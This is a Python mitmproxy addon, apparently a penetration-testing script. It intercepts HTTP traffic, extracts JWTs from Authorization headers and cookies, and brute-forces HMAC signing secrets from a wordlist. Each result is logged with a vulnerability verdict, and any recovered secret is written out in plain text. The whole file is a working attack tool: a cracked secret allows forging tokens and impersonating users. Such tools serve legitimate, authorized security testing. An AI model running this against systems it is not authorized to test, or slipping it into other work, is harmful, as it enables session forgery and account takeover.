from mitmproxy import http
import jwt
from datetime import datetime

WORDLIST_FILE = "jwt.secrets.list"
RESULT_FILE = "jwt_attack_results_script3.txt"

HMAC_ALGS = {"HS256", "HS384", "HS512"}
ASYMMETRIC_ALGS = {"RS256", "RS384", "RS512", "ES256", "ES384", "ES512"}

# Deduplicate per (token, algorithm)
tested_tokens = set()

# ------------------ logging ------------------

def log_result(result, verdict, confidence, details):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: Weak JWT Signing Key\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"DETAILS: {details}\n"
            f"{'-'*60}\n\n"
        )

# ------------------ helpers ------------------

def extract_token(flow):
    # Authorization header
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:]

    # Any cookie that looks like a JWT
    for value in flow.request.cookies.values():
        if value.count(".") == 2:
            return value

    return None

def brute_force_hmac_secret(token, algorithm):
    with open(WORDLIST_FILE, "r", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            try:
                jwt.decode(token, secret, algorithms=[algorithm])
                return secret
            except Exception:
                continue
    return None

# ------------------ mitmproxy hook ------------------

def request(flow: http.HTTPFlow):
    token = extract_token(flow)
    if not token:
        return

    try:
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")
    except Exception:
        return

    key = (token, alg)
    if key in tested_tokens:
        return
    tested_tokens.add(key)

    # -------- Asymmetric algorithms --------
    if alg in ASYMMETRIC_ALGS:
        log_result(
            result="Asymmetric JWT algorithm detected",
            verdict="NOT VULNERABLE",
            confidence="HIGH",
            details=f"{alg} does not rely on shared secrets"
        )
        return

    # -------- Unsupported / unknown --------
    if alg not in HMAC_ALGS:
        log_result(
            result="Unsupported or unknown JWT algorithm",
            verdict="NOT VULNERABLE",
            confidence="LOW",
            details=f"Algorithm: {alg}"
        )
        return

    # -------- HMAC brute force --------
    secret = brute_force_hmac_secret(token, alg)
    if secret:
        log_result(
            result="Weak JWT signing key discovered",
            verdict="VULNERABLE",
            confidence="HIGH",
            details=f"Algorithm: {alg} | Secret: {secret}"
        )
    else:
        log_result(
            result="JWT signing key not found in supplied wordlist",
            verdict="NOT VULNERABLE",
            confidence="MEDIUM",
            details=f"Algorithm: {alg} | Wordlist exhausted"
        )
